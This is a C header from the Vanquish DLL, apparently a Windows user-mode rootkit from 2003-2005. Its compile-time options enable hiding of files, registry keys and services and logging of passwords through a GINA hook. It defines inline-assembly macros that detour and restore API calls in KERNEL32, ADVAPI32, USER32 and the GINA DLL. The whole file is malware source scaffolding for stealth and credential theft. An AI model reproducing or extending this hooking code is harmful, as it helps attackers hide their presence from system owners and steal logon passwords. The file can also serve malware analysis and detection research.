/******************************************************************************\

	Vanquish DLL - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#ifndef __VANQUISH_DLL__H__
#define __VANQUISH_DLL__H__

#include <windows.h>

//Compiling Options:
//VANQUISH_DLLUTILS      - enable dll utils module
//VANQUISH_HIDEFILES     - enable file/folders hiding
//VANQUISH_HIDEREG       - enable registry hiding
//VANQUISH_HIDESERVICES  - enable service hiding
//VANQUISH_PWDLOG        - enable password logging (please note that HIDEREG must also be enabled)
//VANQUISH_SOURCEPROTECT - enable my source protection
#define VANQUISH_DLLUTILS
#define VANQUISH_HIDEFILES
#define VANQUISH_HIDEREG
#define VANQUISH_HIDESERVICES
#define VANQUISH_PWDLOG
//#define VANQUISH_SOURCEPROTECT

//NEW api declaration
#define NEWAPI __declspec(dllexport)

//api call; please remember to declare 'retValue' and do a 'return retValue;' at the end!!!
#define OLDCALL(vapi, cArgs) \
	__asm lea edi, [esp - cArgs * 4] \
	__asm lea esi, [ebp + 8] \
	__asm mov ecx, cArgs \
	__asm rep movsd \
	__asm sub esp, cArgs * 4 \
	__asm call dword ptr [lpOld##vapi] \
	__asm mov [retValue], eax

//fake a direct call; it will not return to us but to the one who called us
#define LASTCALL(vapi, cArgs) \
	__asm mov esp, ebp \
	__asm pop ebp \
	__asm jmp dword ptr [lpOld##vapi]

//a simple function call with return in retValue
#define SIMPLE_CALL(vapi) \
	__asm call dword ptr [lpOld##vapi] \
	__asm mov [retValue], eax

//arguments must be processed in reverse order
#define SIMPLE_ARG(sarg) \
	__asm mov eax, [sarg] \
	__asm push eax

//the equivalent of SIMPLE_ARG() but with constants not variables
#define SIMPLE_CARG(carg) \
	__asm push carg

//the equivalent of SIMPLE_ARG(&parg); push the pointer to arg.
#define SIMPLE_PARG(parg) \
	__asm lea eax, [parg] \
	__asm push eax

//api replacement/restore (please use INITIAL_REPLACE_API for the first time)
#define REPLACE_API(vapi) Vanquish_ReplaceAPI(OLD_API(vapi), V##vapi, bufV##vapi, bufHookV##vapi, 0)
#define RESTORE_API(vapi) Vanquish_RestoreAPI(OLD_API(vapi), V##vapi, bufV##vapi)
#define FINAL_RESTORE_API(vapi) { if (FLAG(vapi) == UPDATEFLAG) Vanquish_RestoreAPI(OLD_API(vapi), V##vapi, bufV##vapi); }
#define INITIAL_REPLACE_API(vapi, vmod) { if ((hm##vmod) && (FLAG(vapi) != UPDATEFLAG)) { FLAG(vapi) = UPDATEFLAG; OLD_API(vapi) = ADDR_OF(vapi, vmod); Vanquish_ReplaceAPI(OLD_API(vapi), V##vapi, bufV##vapi, bufHookV##vapi, 1); } }
#define JUSTLOAD_API(vapi, vmod) { if ((hm##vmod) && (FLAG(vapi) != UPDATEFLAG)) { OLD_API(vapi) = ADDR_OF(vapi, vmod); } }

//here *ALL* libraries must be enumerated
#define DECLARE_VANQUISH_MODULES \
	DECLARE_MODULE(KERNEL32); \
	DECLARE_MODULE(ADVAPI32); \
	DECLARE_MODULE(USER32); \
	DECLARE_MODULE(GINADLL);

//here *ALL* libraries must be enumerated
#define EXTERN_VANQUISH_MODULES \
	EXTERN_MODULE(KERNEL32); \
	EXTERN_MODULE(ADVAPI32); \
	EXTERN_MODULE(USER32); \
	EXTERN_MODULE(GINADLL);

//here *ALL* libraries must be enumerated
#define LOAD_VANQUISH_MODULES \
	LOAD_MODULE(KERNEL32); \
	LOAD_MODULE(ADVAPI32); \
	LOAD_MODULE(USER32); \
	LOAD_MODULE_GINA(GINADLL);

//here *ALL* libraries must be enumerated; only load those that were LOAD_MODULE'd
#define LOAD_VANQUISH(qmod) \
	if (MODULE_UPDATEFLAG(KERNEL32) == UPDATEFLAG) { LOAD_KERNEL32__##qmod } \
	if (MODULE_UPDATEFLAG(ADVAPI32) == UPDATEFLAG) { LOAD_ADVAPI32__##qmod } \
	if (MODULE_UPDATEFLAG(USER32) == UPDATEFLAG) { LOAD_USER32__##qmod } \
	if (MODULE_UPDATEFLAG(GINADLL) == UPDATEFLAG) { LOAD_GINADLL__##qmod }

//here *ALL* libraries must be enumerated
#define UNLOAD_VANQUISH(qmod) \
	UNLOAD_KERNEL32__##qmod \
	UNLOAD_ADVAPI32__##qmod \
	UNLOAD_USER32__##qmod \
	UNLOAD_GINADLL__##qmod

//size of a jmp instruction (relative 32bit offset)
const DWORD JMP_SIZE = 5;

//function prototypes
DWORD posw0(LPCWSTR p);
DWORD pos0(LPCSTR p);
BOOL Vanquish_ReplaceAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf, LPBYTE hooker, DWORD dwInitial);
BOOL Vanquish_RestoreAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf);
LONG MyExceptionFilter(LPEXCEPTION_POINTERS ExceptionInfo);

#endif //__VANQUISH_DLL__H__